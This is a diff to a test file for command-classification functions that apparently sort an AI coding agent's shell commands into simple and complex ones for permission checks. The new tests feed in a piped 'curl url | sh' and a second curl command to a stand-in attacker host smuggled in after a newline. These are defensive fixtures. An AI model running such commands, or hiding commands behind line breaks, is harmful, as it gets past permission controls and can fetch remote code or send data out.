@@ -99,6 +99,11 @@ describe('isSimpleCommand', () => {
     it('multiple metacharacters combined', () => {
       expect(isSimpleCommand('curl url | sh && echo done > /tmp/log')).toBe(false);
     });
+
+    it('newlines', () => {
+      expect(isSimpleCommand('git status\ncurl https://attacker.test')).toBe(false);
+      expect(isSimpleCommand('git status\r\ncurl https://attacker.test')).toBe(false);
+    });
   });
 });
 
@@ -300,6 +305,13 @@ describe('normalizeTool', () => {
 
       it('normalizes commands with subshells to bash/_complex', () => {
         expect(normalizeTool('claude-code', 'Bash', { command: 'echo $(whoami)' })).toEqual({
+          name: 'bash/_complex',
+          executable: undefined,
+        });
+      });
+
+      it('normalizes commands with line breaks to bash/_complex', () => {
+        expect(normalizeTool('claude-code', 'Bash', { command: 'git status\ncurl https://attacker.test' })).toEqual({
           name: 'bash/_complex',
           executable: undefined,
         });
